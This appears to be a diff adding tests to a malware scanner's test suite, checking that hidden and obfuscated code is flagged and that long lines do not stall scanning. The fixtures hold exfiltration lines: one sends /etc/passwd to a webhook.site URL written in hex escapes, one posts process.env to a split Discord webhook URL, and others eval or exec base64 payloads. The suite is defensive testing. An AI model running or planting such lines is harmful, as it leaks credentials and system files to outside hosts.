@@ -347,6 +347,34 @@ test("GitHub review: changed lines block, findings already in the file are only 
   assert.equal(quiet.status, 0, "the only critical finding was already in the file");
 });
 
+test("code hidden with split strings, escapes or a base64 payload is still found", async () => {
+  const hex = s => [...s].map(c => "\\x" + c.charCodeAt(0).toString(16).padStart(2, "0")).join("");
+  const packed = Buffer.from(Array.from({ length: 10 }, (_, i) => `var _0x${(0xa1b2 + i).toString(16)} = ${i};`).join("\n")).toString("base64");
+  const r = await run(project({
+    "hex.py": `import requests\nrequests.post("${hex("https://webhook.site/abc")}", data=open("/etc/passwd").read())\n`,
+    "split.js": `fetch("https://discord.com/api/web" + "hooks/1/abc", { method: "POST", body: JSON.stringify(process.env) });\n`,
+    "packed.js": `eval(Buffer.from("${packed}", "base64").toString());\n`,
+  }), { noIgnore: true });
+  const hidden = r.findings.filter(f => / \(hidden\)$/.test(f.title)).map(f => `${f.file} ${f.rule}`);
+  assert.ok(hidden.includes("hex.py mal-oast-endpoint"), hidden.join(", "));
+  assert.ok(hidden.includes("split.js mal-exfil-endpoint"), hidden.join(", "));
+  assert.ok(hidden.includes("packed.js mal-obfuscator"), hidden.join(", "));
+  assert.equal(r.findings.find(f => f.file === "packed.js" && f.rule === "mal-obfuscator").line, 1);
+
+  const clean = await run(project({
+    "i18n.js": `const msg = "Caf\\u00e9 " + "ouvert";\nconst url = "https://api.example" + ".com/v1";\nconst nl = "line\\x0a";\n`,
+  }), { noIgnore: true });
+  assert.deepEqual(clean.findings.filter(f => / \(hidden\)$/.test(f.title)).map(f => f.rule), []);
+});
+
+test("long lines cannot stall the scan (no catastrophic backtracking)", async () => {
+  // A 500 KB base64 payload on one line once made a rule backtrack for minutes.
+  const blob = "QUFB".repeat(130000);
+  const t0 = performance.now();
+  await run(project({ "pkg/__init__.py": `exec(__import__("base64").b64decode("${blob}"))\n`, "words.js": "abc ".repeat(80000), "eq.py": "a=".repeat(100000) }), { noIgnore: true });
+  assert.ok(performance.now() - t0 < 15000, `scan took ${Math.round(performance.now() - t0)} ms`);
+});
+
 test("CLI prints a report and --fail-on sets the exit code", () => {
   const dir = project({ "a.js": j("eval(at", "ob(x));\n") });
   const cli = path.resolve("skills/vetcode/scripts/vet.mjs");
